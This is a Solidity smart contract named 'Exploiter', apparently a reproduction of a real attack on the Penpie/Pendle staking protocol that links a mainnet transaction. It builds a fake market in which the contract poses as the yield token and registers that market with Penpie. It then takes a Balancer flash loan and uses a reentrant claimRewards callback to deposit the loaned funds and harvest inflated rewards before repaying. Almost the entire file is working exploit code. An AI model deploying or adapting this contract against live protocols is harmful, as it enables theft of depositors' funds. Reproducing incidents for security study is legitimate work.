// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Interfaces.sol";
import "./Constants.sol";

contract Exploiter is ERC20("", "") {

    address PENDLE_Market;

    uint public agETH_flash_bal;
    uint public rswETH_flash_bal;
    uint agETH_deposit_bal;
    uint rswETH_deposit_bal;

    // main functions
    // https://etherscan.io/tx/0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1#eventlog
    function createMarket() external {
        // 创建对应的PT和YT代币
        (address PT, address YT) = Interfaces(PendleYieldContractFactory).createYieldContract(
            address(this),
            1735171200, // expiry, get from the event log
            true
        );

        // 根据PT创建对应的Market
        PENDLE_Market = Interfaces(PendleMarketFactoryV3).createNewMarket(
            PT,
            23352202321000000000, // scalarRoot, get from the event log
            1032480618000000000, // initialAnchor, get from the event log
            1998002662000000 // lnFeeRateRoot, get from the event log
        );

        // 向Penpie注册此Market
        Interfaces(Penpie_PendleMarketRegisterHelper).registerPenpiePool(PENDLE_Market);

        //mint PT
        {
            _mint(address(YT), 1 ether);
            Interfaces(YT).mintPY(
                PENDLE_Market, // PT mint到 Market
                address(this)
            );
        }

        //mint SY
        _mint(PENDLE_Market, 1 ether);

        // 铸造LPT
        Interfaces(PENDLE_Market).mint(address(this), 1 ether, 1 ether);

        // 将全部LPT存入Penpie，获得PRT
        IERC20(PENDLE_Market).approve(PenpieStaking_0x6e79, type(uint).max);
        Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_Market, IERC20(PENDLE_Market).balanceOf(address(this)));
    }

    function attack() public {
        address[] memory tokens = new address[](2);
        tokens[0] = agETH;
        tokens[1] = rswETH;

        //记录贷款数量

        agETH_flash_bal = IERC20(agETH).balanceOf(balancerVault);
        rswETH_flash_bal = IERC20(rswETH).balanceOf(balancerVault);
        uint[] memory amounts = new uint[](2);
        amounts[0] = agETH_flash_bal;
        amounts[1] = rswETH_flash_bal;

        // attack
        Interfaces(balancerVault).flashLoan(address(this), tokens, amounts, '');
    }

    // peripheral functions
    function assetInfo() external view returns (uint8, address, uint8) {
        return (0, address(this), 8);
    }

    function exchangeRate() public pure returns (uint) {
        return 1 ether;
    }

    function getRewardTokens() external view returns (address[] memory tokens) {
        if (PENDLE_Market == msg.sender) {
            tokens = new address[](2);
            tokens[0] = PENDLE_Market_AgETH;
            tokens[1] = PENDLE_Market_rswETH;
            return tokens;
        }
    }

    function rewardIndexesCurrent() external returns (uint[] memory) {}

    uint claimRewardsCall;
    function claimRewards(address user) external returns (uint[] memory rewardAmounts) {

        // 第一次进入此函数，createMarket阶段，用于准备Market
        if (claimRewardsCall == 0) {
            claimRewardsCall++;
            return new uint[](0);
        }

        // attack阶段，执行闪电贷资金的deposit
        if (claimRewardsCall == 1) {

            // agETH -> agETH-SY -> agETH-LPT -> agETH-PRT
            {
                IERC20(agETH).approve(PendleRouterV4, type(uint).max);
                uint bal_agETH = IERC20(agETH).balanceOf(address(this));

                Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
                Interfaces.TokenInput memory input = Interfaces.TokenInput(agETH, bal_agETH, agETH, address(0), swapData);
                Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(address(this), PENDLE_Market_AgETH, 1, 1, input);

                agETH_deposit_bal = IERC20(PENDLE_Market_AgETH).balanceOf(address(this));
                IERC20(PENDLE_Market_AgETH).approve(PenpieStaking_0x6e79, agETH_deposit_bal);
                Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_Market_AgETH, agETH_deposit_bal);
            }
            // rswETH -> rswETH-SY -> rswETH-LPT -> rswETH-PRT
            IERC20(rswETH).approve(PendleRouterV4, type(uint256).max);
            uint256 bal_rswETH = IERC20(rswETH).balanceOf(address(this));
            {
                Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
                Interfaces.TokenInput memory input = Interfaces.TokenInput(rswETH, bal_rswETH, rswETH, address(0), swapData);
                (rswETH_deposit_bal,,,) = Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(address(this), PENDLE_Market_rswETH, 1, 1, input);
            }
            uint bal_PENDLE_Market_rswETH_this = IERC20(PENDLE_Market_rswETH).balanceOf(address(this));
            IERC20(PENDLE_Market_rswETH).approve(PenpieStaking_0x6e79, bal_PENDLE_Market_rswETH_this);
            Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_Market_rswETH, bal_PENDLE_Market_rswETH_this);
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // 攻击开始
        address[] memory _markets = new address[](1);
        _markets[0] = PENDLE_Market;
        Interfaces(PenpieStaking_0x6e79).batchHarvestMarketRewards(_markets, 0);
        // 攻击结束


        // 撤回资金

        Interfaces(Penpie_MasterPenpie).multiclaim(_markets);
        Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_Market_AgETH, agETH_deposit_bal);
        uint bal_this = IERC20(PENDLE_Market_AgETH).balanceOf(address(this));
        IERC20(PENDLE_Market_AgETH).approve(PendleRouterV4, bal_this);
        {
            Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(address(0), 0, new Interfaces.FillOrderParams[](0), new Interfaces.FillOrderParams[](0), '');
            Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
            Interfaces.TokenOutput memory output = Interfaces.TokenOutput(agETH, 0, agETH, address(0), swapData);
            Interfaces(PendleRouterV4).removeLiquiditySingleToken(address(this), PENDLE_Market_AgETH, bal_this, output, limit);
        }

        Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_Market_rswETH, rswETH_deposit_bal);
        uint bal_PENDLE_Market_rswETH = IERC20(PENDLE_Market_rswETH).balanceOf(address(this));
        IERC20(PENDLE_Market_rswETH).approve(PendleRouterV4, bal_PENDLE_Market_rswETH);
        {
            Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(address(0), 0, new Interfaces.FillOrderParams[](0), new Interfaces.FillOrderParams[](0), '');
            Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
            Interfaces.TokenOutput memory output = Interfaces.TokenOutput(rswETH, 0, rswETH, address(0), swapData);
            Interfaces(PendleRouterV4).removeLiquiditySingleToken(address(this), PENDLE_Market_rswETH, bal_PENDLE_Market_rswETH, output, limit);
        }

        //闪电贷还款
        IERC20(agETH).transfer(balancerVault, agETH_flash_bal);
        IERC20(rswETH).transfer(balancerVault, rswETH_flash_bal);
    }
}